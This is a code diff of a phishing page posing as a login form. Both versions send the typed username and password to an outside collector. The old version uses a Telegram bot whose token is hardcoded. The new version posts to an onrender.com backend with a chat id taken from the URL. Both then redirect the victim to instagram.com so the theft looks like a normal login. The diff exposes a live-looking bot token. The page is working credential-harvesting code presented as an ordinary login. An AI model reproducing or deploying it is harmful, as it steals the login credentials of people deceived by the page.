@@ -2,7 +2,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Secure Login</title>
+  <title>Login</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -32,31 +32,36 @@
 </head>
 <body>
   <h2>Login to Continue</h2>
-  <form onsubmit="sendToTelegram(event)">
+  <form onsubmit="submitLogin(event)">
     <input type="text" id="username" placeholder="Username" required /><br>
     <input type="password" id="password" placeholder="Password" required /><br>
     <button type="submit">Login</button>
   </form>
 
   <script>
-    function sendToTelegram(e) {
+    function submitLogin(e) {
       e.preventDefault();
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      const message = `🚨 New Login Attempt:\n👤 Username: ${username}\n🔐 Password: ${password}`;
-      const botToken = "8198334501:AAHSHTAeIzETcnkPAYzO-j0rZ3DmwU1xDeU";
-      const chatId = "1364726635";
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const urlParams = new URLSearchParams(window.location.search);
+      const chatId = urlParams.get("id");
 
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      if (!chatId) {
+        alert("Missing Telegram user ID in URL.");
+        return;
+      }
+
+      fetch("https://render-backend-package1.onrender.com/submit", {
         method: "POST",
-        headers: { 'Content-Type': 'application/json' },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: chatId,
-          text: message
+          username: username,
+          password: password
         })
       }).then(() => {
         alert("Processing login...");
-        window.location.href = "https://instagram.com"; // redirect to make it more realistic
+        window.location.href = "https://instagram.com";
       });
     }
   </script>
